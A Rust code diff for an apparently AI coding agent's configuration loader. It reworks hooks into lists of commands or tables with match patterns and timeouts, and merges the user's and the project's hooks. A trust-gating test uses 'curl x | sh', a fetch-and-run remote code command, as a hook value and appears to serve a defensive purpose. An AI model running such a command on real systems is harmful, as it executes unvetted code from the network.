@@ -275,17 +275,98 @@ impl LspServer {
     }
 }
 
+/// The hooks of each event, each written as a command or as a table, alone or in a list.
+/// See `agent::hooks` for what each event does.
 #[derive(Debug, Clone, Default, Deserialize, PartialEq, Eq)]
 #[serde(rename_all = "kebab-case", deny_unknown_fields)]
 pub struct HooksSection {
-    /// Run before a tool that changes something. A non-zero exit refuses the call and
-    /// what it printed is handed to the model, which is what makes a policy check part
-    /// of the loop rather than advice nobody reads.
-    pub pre_tool: Option<String>,
-    /// Run after such a tool, whatever it did.
-    pub post_tool: Option<String>,
-    /// Run when a turn ends. A formatter or a test suite belongs here.
-    pub turn_end: Option<String>,
+    #[serde(default, deserialize_with = "one_or_many")]
+    pub session_start: Vec<Hook>,
+    #[serde(default, deserialize_with = "one_or_many")]
+    pub prompt: Vec<Hook>,
+    #[serde(default, deserialize_with = "one_or_many")]
+    pub pre_tool: Vec<Hook>,
+    #[serde(default, deserialize_with = "one_or_many")]
+    pub post_tool: Vec<Hook>,
+    #[serde(default, deserialize_with = "one_or_many")]
+    pub turn_end: Vec<Hook>,
+    #[serde(default, deserialize_with = "one_or_many")]
+    pub agent_end: Vec<Hook>,
+    #[serde(default, deserialize_with = "one_or_many")]
+    pub compact: Vec<Hook>,
+}
+
+impl HooksSection {
+    /// Both sides' hooks, those of `base` first.
+    fn after(mut self, over: HooksSection) -> HooksSection {
+        self.session_start.extend(over.session_start);
+        self.prompt.extend(over.prompt);
+        self.pre_tool.extend(over.pre_tool);
+        self.post_tool.extend(over.post_tool);
+        self.turn_end.extend(over.turn_end);
+        self.agent_end.extend(over.agent_end);
+        self.compact.extend(over.compact);
+        self
+    }
+}
+
+/// One hook.
+#[derive(Debug, Clone, PartialEq, Eq, Deserialize)]
+#[serde(from = "HookForm")]
+pub struct Hook {
+    pub command: String,
+    /// The tools it runs for, as patterns joined by `|`. Without it, the tools that change
+    /// something.
+    pub matches: Option<String>,
+    /// Seconds it may take.
+    pub timeout: Option<u64>,
+}
+
+#[derive(Deserialize)]
+#[serde(untagged)]
+enum HookForm {
+    Line(String),
+    Table(HookTable),
+}
+
+#[derive(Deserialize)]
+#[serde(rename_all = "kebab-case", deny_unknown_fields)]
+struct HookTable {
+    command: String,
+    #[serde(rename = "match")]
+    matches: Option<String>,
+    timeout: Option<u64>,
+}
+
+impl From<HookForm> for Hook {
+    fn from(form: HookForm) -> Self {
+        match form {
+            HookForm::Line(command) => Hook {
+                command,
+                matches: None,
+                timeout: None,
+            },
+            HookForm::Table(t) => Hook {
+                command: t.command,
+                matches: t.matches,
+                timeout: t.timeout,
+            },
+        }
+    }
+}
+
+/// A hook alone or a list of them.
+fn one_or_many<'de, D: serde::Deserializer<'de>>(d: D) -> Result<Vec<Hook>, D::Error> {
+    #[derive(Deserialize)]
+    #[serde(untagged)]
+    enum OneOrMany {
+        One(Hook),
+        Many(Vec<Hook>),
+    }
+    Ok(match OneOrMany::deserialize(d)? {
+        OneOrMany::One(h) => vec![h],
+        OneOrMany::Many(hs) => hs,
+    })
 }
 
 #[derive(Debug, Clone, Default, Deserialize)]
@@ -604,11 +685,7 @@ pub fn merge(base: FileConfig, over: FileConfig) -> FileConfig {
                 servers
             },
         },
-        hooks: HooksSection {
-            pre_tool: over.hooks.pre_tool.or(base.hooks.pre_tool),
-            post_tool: over.hooks.post_tool.or(base.hooks.post_tool),
-            turn_end: over.hooks.turn_end.or(base.hooks.turn_end),
-        },
+        hooks: base.hooks.after(over.hooks),
         approve: crate::sandbox::policy::Policy {
             // Added to rather than replaced, on both sides: a project stating what is
             // safe in it must not drop the user's own refusals, and a user's refusal must
@@ -1126,6 +1203,26 @@ mod tests {
         });
     }
 
+    /// A hook is a line or a table, alone or in a list, and both files' hooks run.
+    #[test]
+    fn hooks_are_read_in_every_form_and_added_up() {
+        let user = parse("[hooks]\nturn-end = \"cargo fmt\"\n");
+        let project = parse(
+            "[[hooks.turn-end]]\ncommand = \"cargo test\"\ntimeout = 600\n\
+             [[hooks.pre-tool]]\ncommand = \"guard\"\nmatch = \"bash\"\n",
+        );
+        let merged = merge(user, project);
+        let commands: Vec<_> = merged
+            .hooks
+            .turn_end
+            .iter()
+            .map(|h| h.command.as_str())
+            .collect();
+        assert_eq!(commands, ["cargo fmt", "cargo test"]);
+        assert_eq!(merged.hooks.turn_end[1].timeout, Some(600));
+        assert_eq!(merged.hooks.pre_tool[0].matches.as_deref(), Some("bash"));
+    }
+
     /// The project is writable whether or not anything was named.
     #[test]
     fn the_project_is_always_writable() {
@@ -1301,7 +1398,7 @@ mod instruction_tests {
             || {
                 let loaded = load(&root, false).unwrap();
                 assert_eq!(loaded.file.model.as_deref(), Some("m"));
-                assert_eq!(loaded.file.hooks.turn_end, None);
+                assert!(loaded.file.hooks.turn_end.is_empty());
                 assert!(loaded.file.approve.allow.bash.is_empty());
                 assert_eq!(loaded.file.approve.deny.bash, ["git push*"]);
                 let untrusted = loaded.untrusted.unwrap();
@@ -1311,7 +1408,7 @@ mod instruction_tests {
                 crate::trust::grant(&root, &untrusted.guarded).unwrap();
                 let loaded = load(&root, false).unwrap();
                 assert!(loaded.untrusted.is_none());
-                assert_eq!(loaded.file.hooks.turn_end.as_deref(), Some("curl x | sh"));
+                assert_eq!(loaded.file.hooks.turn_end[0].command, "curl x | sh");
 
                 std::fs::write(
                     project_config_path(&root),
